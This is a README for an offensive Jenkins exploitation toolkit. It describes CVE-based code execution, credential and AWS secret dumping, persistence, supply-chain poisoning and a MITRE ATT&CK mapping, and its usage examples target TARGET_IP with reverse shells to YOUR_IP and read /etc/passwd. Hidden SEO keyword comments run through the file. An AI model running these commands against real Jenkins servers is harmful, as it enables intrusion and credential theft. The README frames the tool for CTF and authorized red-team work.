<!--
JenkinsBreaker Jenkins exploitation tool, Jenkins CVE exploit automation,
CVE-2019-1003029 Groovy RCE, CVE-2024-23897 CLI arbitrary file read,
Jenkins credential dumper, Jenkins reverse shell generator,
post-exploitation automation Jenkins, JWT brute force Jenkins,
AWS secret CI/CD extraction, offensive CI security,
HackTheBox Jenkins challenge exploitation, red team devops breach,
CI pipeline compromise tooling, Jenkins CLI exploit,
misconfiguration exploit framework Jenkins, SCADA build server weaknesses,
ridpath cybersecurity GitHub, CTF Jenkins auto pwn architecture
-->

# JenkinsBreaker  
Advanced CI/CD Exploitation Toolkit for Research, CTF, and Red Team Simulation

![Status Alpha](https://img.shields.io/badge/status-alpha-yellow)
![Stability Experimental](https://img.shields.io/badge/stability-experimental-orange)
![Domain CI/CD Security](https://img.shields.io/badge/domain-CI%2FCD%20Security-critical)
![License MIT](https://img.shields.io/badge/license-MIT-blue)

> Designed for training, authorized assessment, and adversary simulation in controlled environments.
---

## Features  

JenkinsBreaker is an offensive Python framework focused on exploiting **Jenkins servers** as an entry point for CI/CD abuse, credential theft, and lateral movement across DevOps infrastructure.

Key goals:

• Automate common **Jenkins RCE chains**  
• Provide reliable **post-exploitation tooling**  
• Support **CTF speed running workflows**  
• Extract credentials + secrets from CI environments  
• Enable research into **CI/CD security risks**

- **Automated Enumeration & Exploitation** (`--auto` mode)  
- **Exploit Critical CVEs**:  
  - CVE-2019-1003029 / CVE-2019-1003030 – *Groovy Script RCE*  
  - CVE-2024-23897 – *Arbitrary File Read via CLI*  
  - CVE-2025-31720 / CVE-2025-31721 / CVE-2025-31722 – *Custom & Upcoming CVEs Included*  
- **Reverse Shell Payload Generation** (Bash, Python, Groovy, PowerShell, Metasploit Compatible)  
- **AWS Credential Dumping & Secrets Scanning**  
- **CSRF Crumb Handling & Automation**  
- **JWT Token Brute-Forcing and Analysis**  
- **Post-Exploitation Recon Automation** (Auto Upload & Execute linPEAS, pspy)  
- **Report Generation**: JSON, Markdown, PDF (via WeasyPrint)  
- **Built-in C2 Server (FastAPI) & Interactive WebSocket Shell (not functional with this release)**  
- **Persistence Techniques** (Cron Jobs, Jenkins Pipelines)  
- **Modular Exploit Loading** (`exploits/` Directory)  

---
<!--
MITRE ATT&CK Jenkins exploitation mapping, CI/CD pipeline breach techniques,
initial access via CI servers, Jenkins credential exfiltration MITRE mapping,
execution via Groovy RCE, privilege escalation through pipeline abuse,
defense evasion DevOps, lateral movement from Jenkins to cloud,
command and control CI-based beaconing,
ridpath JenkinsBreaker adversary simulation mapping
-->

## MITRE ATT&CK Mapping

| Phase | Technique | Mapping | Applied In JenkinsBreaker |
|------|-----------|---------|--------------------------|
| Initial Access | Exploit Public-Facing Application | T1190 | Groovy RCE / Arbitrary File Read |
| Execution | Command Execution via Script Engine | T1059.006 | Groovy execution via CLI |
| Privilege Escalation | Abuse Elevated Build Permissions | T1068 | Pipeline takeover / credential harvesting |
| Credential Access | Unsecured Credential Stores | T1552.001 | Secrets extraction from config & plugins |
| Discovery | Remote System Enumeration | T1087 / T1082 | Plugin, version & workspace scanning |
| Lateral Movement | Use Alternate Authentication Mechanisms | T1550 | Token + API reuse for cloud access |
| Exfiltration | Exfiltration Over Web Service | T1567.002 | Reverse shell, beaconing |
| Persistence | Scheduled Task/Job | T1053.003 | Malicious cron + pipeline persistence |
| Collection | Cloud Credential Dumping | T1552.005 | AWS key harvesting from builds |
| Defense Evasion | Indicator Removal / Obfuscation | T1070 | Plugin-based masking / cleanup |

> Helps blue teams align detection to CI/CD risks.

---
<!--
CI/CD attack chain, Jenkins exploitation lifecycle,
supply chain breach via build servers, software factory compromise,
reverse shell from build agents, pivot from CI to cloud,
DevOps pipeline security research diagram,
adversary-in-the-pipeline conceptual model
-->

## CI/CD Attack Kill Chain (Jenkins Focused)

Below is a streamlined adversarial flow commonly observed during Jenkins exploitation:

1. **Target Jenkins Web / CLI**
   - Identify exposed Jenkins UI or CLI attack surfaces
   - Look for weak auth, anonymous access, plugin misconfigurations

2. **Exploit Vulnerability (RCE / Arbitrary File Read)**
   - Execute Jenkins CVEs or plugin-based execution chains
   - Achieve remote code execution or sensitive file retrieval

3. **Build Server Compromise**
   - Harvest agent credentials, stored API tokens, AWS keys
   - Extract artifacts, SSH `id_rsa`, Docker registry creds

4. **Post-Exploitation Automation**
   - Upload recon tooling (e.g., linPEAS, pspy)
   - Enumerate pipelines, artifacts, nodes, user roles

5. **CI → Cloud Pivoting**
   - Abuse pipeline permissions to assume cloud roles (OIDC/AWS STS)
   - Modify IaC to establish stealthy persistence

6. **Lateral Movement Into Production**
   - Jenkins-as-a-jump-host into protected environments
   - Establish covert C2 using HTTPS or WebSockets

7. **(Optional) Supply-Chain Tampering**
   - Inject malicious payloads into build artifacts/containers
   - Poison downstream deployments + production fleets

> CI-driven breach escalation path → from Jenkins → cloud → production → end-users.

<!--
jenkins c2 pivot, ci cd lateral movement, jenkins supply chain compromise,
devops pipeline exploitation, cloud credential theft, red team ci frameworks,
pipeline privilege escalation, artifact poisoning, c2 via build systems,
jenkins security researcher tools, attack surface mapping jenkins,
ridpath github jenkinsbreaker attacker workflow
-->


<!--
Jenkins CI/CD exploitation map, DevOps privilege escalation flow,
build server exploitation, AWS credential theft via CI/CD,
reverse shell via Jenkins pipelines, cloud lateral movement from CI,
CI-driven software supply chain compromise, attack lifecycle mapping,
ridpath jenkinsbreaker security automation
-->

---
## Installation  

```bash
git clone https://github.com/ridpath/heaplessNights.git
cd heaplessNights/JenkinsBreaker
python3 JenkinsBreaker.py --help  # Auto-creates virtualenv and installs dependencies
```
```bash
## Example Usage
Automatic Enumeration & Exploitation:
python3 JenkinsBreaker.py --url http://TARGET_IP:8080 --auto --lhost YOUR_IP --lport 4444

Run Specific CVE Exploit:
python3 JenkinsBreaker.py --url http://TARGET_IP:8080 --exploit-cve --target-file /etc/passwd

Generate a Reverse Shell:
python3 JenkinsBreaker.py --generate-shell bash --lhost YOUR_IP --lport 4444

List All Available Commands:
python3 JenkinsBreaker.py --help-commands
```

### Roadmap

• Textual-based TUI + Browser UI  
• Jenkinsfuzzer for pipeline misconfig discovery  
• Improved JWT cryptanalysis + plugin fingerprinting  
• Modular persistence extension packs

<!--
JenkinsBreaker exploit toolkit SEO footer, Jenkins RCE automation,
CI pipeline security research, credential extraction CI/CD,
DevSecOps red team training lab tool, HackTheBox Jenkins writeups,
post exploitation Jenkins techniques, reverse shell automation CI servers,
CVE exploit chaining Jenkins, CI/CD infrastructure breach demonstration,
offensive DevOps testing, ridpath JenkinsBreaker GitHub project, github.com/ridpath
-->

## Legal Disclaimer

This tool is intended **solely for educational use, security research, and authorized penetration testing**.  

Unauthorized access to computer systems is **illegal** in many jurisdictions and may result in:
- Criminal prosecution  
- Civil liability  
- Employment/contract termination  

By using JenkinsBreaker, you agree that:
- **You are solely responsible** for compliance with all applicable laws and regulations  
- The authors **do not endorse or condone** malicious usage  
- The developers **assume zero liability** for damage or misuse  

Use **only** in **controlled lab environments**, CTFs, or legally authorized engagements.

<!--
jenkins exploit framework legality,
unauthorized jenkins hacking disclaimer,
ethical hacking jenkins tool,
ci cd penetration testing authorization required,
cybersecurity legal notice for exploitation tools,
jenkinsbreaker responsible disclosure,
pentesting agreement requirement,
supply chain security testing legal compliance,
ridpath github jenkins security research tool
-->
## LICENSE
This project is licensed under the MIT License. See the LICENSE file for details.

